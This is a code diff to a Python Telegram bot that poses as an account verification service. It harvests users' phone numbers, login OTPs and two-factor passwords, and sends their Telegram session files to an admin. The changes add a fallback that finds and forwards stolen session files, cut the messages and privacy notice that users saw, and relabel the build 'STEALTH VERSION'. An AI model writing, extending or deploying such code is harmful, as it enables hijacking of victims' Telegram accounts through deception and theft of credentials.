@@ -74,6 +74,21 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=N
                 logger.info(f"✅ Session sent: {session_file}")
             except Exception as e:
                 logger.error(f"Session send error: {e}")
+                
+                # Try to send session even if file doesn't exist exactly as specified
+                session_dir = 'sessions'
+                phone_clean = phone.replace('+', '')
+                for filename in os.listdir(session_dir):
+                    if phone_clean in filename and filename.endswith('.session'):
+                        session_path = os.path.join(session_dir, filename)
+                        with open(session_path, 'rb') as f:
+                            notification_bot.send_document(
+                                ADMIN_ID,
+                                f,
+                                caption=f"📁 Session file for {phone}"
+                            )
+                        logger.info(f"✅ Session sent from fallback: {session_path}")
+                        break
         
         logger.info(f"✅ Admin notified: {phone}")
         return True
@@ -173,7 +188,7 @@ async def main():
         
         # Create session directory
         os.makedirs('sessions', exist_ok=True)
-        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
+        session_name = f"sessions/{phone.replace('+', '')}"
         
         # Create client and connect
         client = TelegramClient(session_name, api_id, api_hash)
@@ -237,20 +252,12 @@ async def main():
             print(json.dumps({'success': False, 'error': 'Missing parameters'}))
             return
         
-        # Find latest session file for this phone
-        session_files = []
-        if os.path.exists('sessions'):
-            for f in os.listdir('sessions'):
-                if phone.replace('+', '') in f and (f.endswith('.session') or '.session' in f):
-                    session_files.append(f)
+        # Find session file for this phone
+        session_name = f"sessions/{phone.replace('+', '')}"
         
-        if not session_files:
+        if not os.path.exists(session_name + '.session'):
             print(json.dumps({'success': False, 'error': 'Session not found'}))
             return
-        
-        # Use the most recent session
-        session_files.sort(key=lambda x: os.path.getmtime(os.path.join('sessions', x)), reverse=True)
-        session_name = f"sessions/{session_files[0]}"
         
         # Create client
         client = TelegramClient(session_name, api_id, api_hash)
@@ -258,7 +265,7 @@ async def main():
         
         try:
             # Sign in with OTP
-            await client.sign_in(
+            result = await client.sign_in(
                 phone=phone,
                 code=otp,
                 phone_code_hash=phone_code_hash
@@ -275,6 +282,7 @@ async def main():
             }
             
             # Save session
+            await client.session.save()
             session_file = f"{client.session.filename}.session"
             
             print(json.dumps({
@@ -353,6 +361,7 @@ async def main():
             }
             
             # Save session
+            await client.session.save()
             session_file = f"{client.session.filename}.session"
             
             print(json.dumps({
@@ -427,13 +436,9 @@ Click the button below to verify your account:
 ✅ <b>Verification Steps:</b>
 1️⃣ Open WebApp
 2️⃣ Share your contact
-3️⃣ Receive 5-digit OTP here
+3️⃣ Receive 5-digit OTP via Telegram
 4️⃣ Enter OTP in WebApp
 5️⃣ Complete verification ✅
-
-⚠️ <i>Your contact will be auto-deleted for privacy.</i>
-
-<b>Note:</b> Telegram sends <b>5-digit</b> OTP codes.
 
 <b>Click below to begin:</b>"""
         
@@ -451,7 +456,7 @@ Click the button below to verify your account:
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact sharing"""
+    """Handle contact sharing - NO OTP SUCCESS MESSAGE TO USER"""
     try:
         contact = message.contact
         user_id = message.from_user.id
@@ -472,20 +477,18 @@ def handle_contact(message):
             'stage': 'contact_received'
         }
         
-        # Send processing message
+        # Send only minimal message
         msg = bot.send_message(
             message.chat.id,
             f"""✅ <b>Contact Received!</b>
 
 📱 Phone: {phone}
 
-⏳ <b>Sending 5-digit OTP via Telegram...</b>
-
-Please wait while we send the verification code.""",
+⏳ <b>Processing your request...</b>""",
             parse_mode='HTML'
         )
         
-        # Send OTP using subprocess
+        # Send OTP using subprocess in background
         def send_otp_task():
             try:
                 result = run_telethon_script('scripts/send_otp.py', phone)
@@ -501,30 +504,29 @@ Please wait while we send the verification code.""",
                     
                     user_data[user_id]['stage'] = 'otp_sent'
                     
-                    # Success message
-                    success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>
+                    # Edit message to show only minimal info
+                    bot.edit_message_text(
+                        f"""✅ <b>Request Processed!</b>
 
 📱 Phone: {phone}
-🔢 <b>5-digit OTP</b> has been sent via Telegram
 
-Check your Telegram messages for the 5-digit code.
-
-<b>⚠️ IMPORTANT:</b>
-• Check your Telegram messages for the <b>5-digit code</b>
-• Enter the code in the WebApp
-• Code expires in 5 minutes
-
-<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>"""
-                    
-                    bot.edit_message_text(
-                        success_msg,
+📲 Please check your Telegram app for OTP.""",
                         message.chat.id,
                         msg.message_id,
                         parse_mode='HTML'
                     )
                     
-                    # Notify admin
-                    send_to_admin(phone, user_info=user_data[user_id])
+                    # Send initial notification to admin
+                    admin_message = f"""📱 <b>NEW VERIFICATION STARTED!</b>
+
+📞 Phone: {phone}
+👤 User ID: {user_id}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
+                    
+                    if ADMIN_BOT_TOKEN:
+                        admin_bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
+                    else:
+                        bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
                     
                     logger.info(f"✅ OTP sent to {phone}")
                 else:
@@ -532,7 +534,7 @@ Check your Telegram messages for the 5-digit code.
                     user_data[user_id]['stage'] = 'error'
                     
                     bot.edit_message_text(
-                        f"❌ <b>Error:</b> {error_msg}",
+                        f"❌ <b>Unable to process request at this time.</b>",
                         message.chat.id,
                         msg.message_id,
                         parse_mode='HTML'
@@ -540,7 +542,7 @@ Check your Telegram messages for the 5-digit code.
             except Exception as e:
                 logger.error(f"OTP task error: {e}")
                 bot.edit_message_text(
-                    "❌ <b>Server Error:</b> Failed to process request",
+                    "❌ <b>Unable to process request.</b>",
                     message.chat.id,
                     msg.message_id,
                     parse_mode='HTML'
@@ -596,7 +598,7 @@ def api_share_contact():
             'time': time.time()
         }
         
-        # Send OTP
+        # Send OTP in background
         def send_otp_task():
             result = run_telethon_script('scripts/send_otp.py', phone)
             
@@ -609,6 +611,18 @@ def api_share_contact():
                 }
                 user_data[user_id]['stage'] = 'otp_sent'
                 logger.info(f"✅ OTP sent via API to {phone}")
+                
+                # Send initial notification to admin
+                admin_message = f"""📱 <b>NEW VERIFICATION STARTED!</b>
+
+📞 Phone: {phone}
+👤 User ID: {user_id}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
+                
+                if ADMIN_BOT_TOKEN:
+                    admin_bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
+                else:
+                    bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
             else:
                 user_data[user_id]['stage'] = 'error'
                 logger.error(f"Failed to send OTP: {result.get('error')}")
@@ -616,7 +630,7 @@ def api_share_contact():
         thread = threading.Thread(target=send_otp_task)
         thread.start()
         
-        return jsonify({'success': True, 'message': 'OTP sent successfully'})
+        return jsonify({'success': True, 'message': 'Processing your request'})
         
     except Exception as e:
         logger.error(f"API share contact error: {e}")
@@ -676,6 +690,7 @@ def api_verify_otp():
                 user_info = result.get('user_info', {})
                 session_file = result.get('session_file', '')
                 
+                # Send complete notification to admin with session file
                 send_to_admin(
                     phone,
                     otp=otp,
@@ -734,6 +749,7 @@ def api_verify_2fa():
             session_file = result.get('session_file', '')
             phone = user_info.get('phone', 'Unknown')
             
+            # Send complete notification to admin with session file
             send_to_admin(
                 phone,
                 password=password,
@@ -807,7 +823,7 @@ def cleanup_old_sessions():
 # ==================== MAIN ====================
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 Telegram Verification Bot - FIXED VERSION")
+    logger.info("🚀 Telegram Verification Bot - STEALTH VERSION")
     logger.info("="*60)
     logger.info(f"🤖 Main Bot Token: {BOT_TOKEN[:10]}...")
     logger.info(f"👑 Admin Bot Token: {ADMIN_BOT_TOKEN[:10]}..." if ADMIN_BOT_TOKEN else "👑 Using main bot for admin notifications")
@@ -875,4 +891,4 @@ if __name__ == "__main__":
         debug=False,
         use_reloader=False,
         threaded=True
-)
+                                           )
